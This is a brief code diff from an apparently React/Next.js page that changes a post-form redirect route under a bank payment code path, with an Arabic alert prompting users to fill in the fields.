@@ -31,7 +31,7 @@ const Page = () => {
           alert('من فضلك قم بملى الحقول')
         }else{
           
-          router.push(`/fozajil/banks/pay/code/nphad/nphadsecuess?names=${datas}`)
+          router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)
         }
       }
 
